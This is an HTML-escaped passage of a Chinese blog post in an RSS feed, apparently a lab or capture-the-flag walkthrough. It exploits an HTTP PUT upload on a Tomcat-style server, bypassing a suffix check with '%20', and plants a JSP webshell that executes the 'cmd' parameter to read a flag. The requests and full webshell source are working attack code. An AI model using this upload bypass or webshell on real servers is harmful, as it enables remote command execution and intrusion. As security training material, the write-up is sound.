&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;/1.jsp&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;192.168.209.130:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	这里发现无法上传，报错是 405–Method Not Allowed，查资料说的是后缀不允许，所以在 / 1.jsp 后面加上 %20 再试试，结果如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/1.1 204 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Mon, 17 Jun 2024 13:40:05 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	应该是上传成功了，访问下这个文件试试；&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/26fdf3232c614210abcf5538ccccad2a.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	能访问到，说明这里就上传成功了，那么，接下来上传 jsp 马，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;/1.jsp%20&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;192.168.209.130:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;635&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&amp;lt;%@ page import=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.io.InputStream&amp;quot;&lt;/span&gt; %&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;/span&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&amp;lt;%@ page import=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.io.BufferedReader&amp;quot;&lt;/span&gt; %&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;/span&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&amp;lt;%@ page import=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.io.InputStreamReader&amp;quot;&lt;/span&gt; %&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;/span&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&amp;lt;%@ page contentType=&lt;span class=&#34;string&#34;&gt;&amp;quot;text/html;charset=UTF-8&amp;quot;&lt;/span&gt; language=&lt;span class=&#34;string&#34;&gt;&amp;quot;java&amp;quot;&lt;/span&gt; %&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;一句话木马&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;/span&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;  Process process = Runtime.getRun&lt;span class=&#34;built_in&#34;&gt;time&lt;/span&gt;().exec(&lt;span class=&#34;built_in&#34;&gt;request&lt;/span&gt;.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;  InputStream inputStream = process.getInputStream();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;  BufferedReader bufferedReader =  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; BufferedReader(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InputStreamReader(inputStream));&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;  String line;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((line = bufferedReader.readLine())!=&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;response&lt;/span&gt;.getWriter().pr&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(line);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-vbscript&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-vbscript-html&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	这里很明显可以得知木马的参数为 cmd，所以访问之后直接传递 cmd 的参数即可执行命令，cmd=cat /flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/14260754e6a041acb01c6ac27facfab6.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
